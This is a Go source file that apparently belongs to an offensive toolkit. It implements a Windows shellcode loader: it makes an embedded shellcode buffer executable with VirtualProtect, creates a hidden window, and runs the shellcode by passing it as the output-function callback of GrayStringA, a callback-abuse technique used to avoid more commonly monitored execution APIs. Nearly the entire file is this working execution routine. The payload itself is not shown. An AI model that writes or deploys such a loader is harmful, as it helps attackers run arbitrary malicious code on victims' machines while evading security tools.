package sh

import (
	"fmt"
	"time"
	"unsafe"
	api "github.com/carved4/go-wincall"
)

var (
	windowHandle uintptr
)

func ExecuteViaGrayString() error {
	shellcode := GetEmbeddedShellcode()
	
	var oldProtect uint32
	shellcodePtr := uintptr(unsafe.Pointer(&shellcode[0]))
	
	success, err := api.Call("kernel32.dll", "VirtualProtect",
		shellcodePtr,                         // lpAddress
		uintptr(len(shellcode)),             // dwSize
		0x40,                                // PAGE_EXECUTE_READWRITE
		uintptr(unsafe.Pointer(&oldProtect)), // lpflOldProtect
	)
	if err != nil || success == 0 {
		return fmt.Errorf("VirtualProtect failed: %v", err)
	}
	
	windowHandle, err = createSimpleWindow()
	if err != nil {
		return fmt.Errorf("failed to create window: %v", err)
	}
	defer destroyWindow()
	
	hdc, err := api.Call("user32.dll", "GetDC", windowHandle)
	if err != nil || hdc == 0 {
		return fmt.Errorf("GetDC failed: %v", err)
	}
	defer api.Call("user32.dll", "ReleaseDC", windowHandle, hdc)
	
	testString := "Test\x00"
	success, err = api.Call("user32.dll", "GrayStringA",
		hdc,                                               // hDC
		uintptr(0),                                       // hBrush (default)
		shellcodePtr,                                     // lpOutputFunc (our shellcode)
		uintptr(unsafe.Pointer(&[]byte(testString)[0])), // lpData
		uintptr(len(testString)-1),                      // nCount
		uintptr(10),                                     // X
		uintptr(10),                                     // Y
		uintptr(100),                                    // nWidth
		uintptr(20),                                     // nHeight
	)
	if err != nil {
		return fmt.Errorf("GrayStringA failed: %v", err)
	}
	
	time.Sleep(100 * time.Millisecond)
	
	return nil
}

func createSimpleWindow() (uintptr, error) {
	className := "ShellcodeWindow\x00"
	windowName := "Hidden\x00"
	
	hInstance, err := api.Call("kernel32.dll", "GetModuleHandleW", uintptr(0))
	if err != nil {
		return 0, err
	}
	
	hwnd, err := api.Call("user32.dll", "CreateWindowExA",
		uintptr(0),                                        // dwExStyle
		uintptr(unsafe.Pointer(&[]byte(className)[0])),   // lpClassName
		uintptr(unsafe.Pointer(&[]byte(windowName)[0])),  // lpWindowName
		uintptr(0),                                       // dwStyle (hidden)
		uintptr(0),                                       // X
		uintptr(0),                                       // Y
		uintptr(100),                                     // nWidth
		uintptr(100),                                     // nHeight
		uintptr(0),                                       // hWndParent
		uintptr(0),                                       // hMenu
		hInstance,                                        // hInstance
		uintptr(0),                                       // lpParam
	)
	
	return hwnd, err
}

func destroyWindow() {
	if windowHandle != 0 {
		api.Call("user32.dll", "DestroyWindow", windowHandle)
		windowHandle = 0
	}
}